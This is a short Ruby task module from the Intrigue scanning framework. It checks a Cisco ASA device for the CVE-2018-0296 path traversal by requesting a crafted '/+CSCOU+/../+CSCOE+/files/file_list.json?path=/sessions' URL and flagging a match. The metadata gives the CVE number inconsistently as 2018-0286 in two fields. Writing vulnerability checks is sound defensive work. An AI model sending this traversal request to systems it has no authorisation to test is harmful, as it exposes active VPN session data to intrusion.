module Intrigue
  module Task
  class CiscoAsaPathTraversalCve20180296 < BaseTask
  
    def self.metadata
      {
        :name => "vuln/cisco_asa_path_traversal_cve_2018_0296",
        :pretty_name => "Vuln Check - Cisco ASA Path Traversal (CVE-2018-0286)",
        :authors => ["jcran"],
        :identifiers => [{ "cve" =>  "CVE-2018-0286" }],
        :description => "This task checks a cisco ASA for a path traversal vulnerability",
        :type => "vuln_check",
        :passive => false,
        :allowed_types => ["Uri"],
        :example_entities => [{"type" => "Uri", "details" => {"name" => "https://intrigue.io"}}],
        :allowed_options => [],
        :created_types => []
      }
    end
  
    ## Default method, subclasses must override this
    def run
      super
      
      require_enrichment

      body = http_get_body "#{_get_entity_name}/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions"
      
      if body =~ /\/\/\/sessions/
        _create_linked_issue "cisco_asa_path_traversal_cve_2018_0296", { "proof" => body }
      end

    end
  
   
  end
  end
  end
  